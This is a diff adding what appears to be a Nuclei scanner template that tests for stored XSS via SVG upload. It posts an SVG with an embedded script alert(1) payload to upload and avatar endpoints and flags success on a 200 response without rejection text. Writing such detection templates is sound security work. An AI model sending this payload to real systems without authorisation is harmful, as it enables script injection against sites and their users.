@@ -1,0 +1,39 @@
+id: whai-xss-svg-upload
+
+info:
+  name: XSS via SVG File Upload
+  author: whitehat-ai
+  severity: high
+  description: Tests stored XSS through SVG upload
+  tags: xss,svg,upload,high
+  classification:
+    cwe-id: CWE-79
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/upload"
+      - "{{BaseURL}}/api/avatar"
+
+    headers:
+      Content-Type: multipart/form-data; boundary=----Boundary
+
+    body: |
+      ------Boundary
+      Content-Disposition: form-data; name="file"; filename="xss.svg"
+      Content-Type: image/svg+xml
+
+      <svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
+      ------Boundary--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "rejected"
+          - "not allowed"
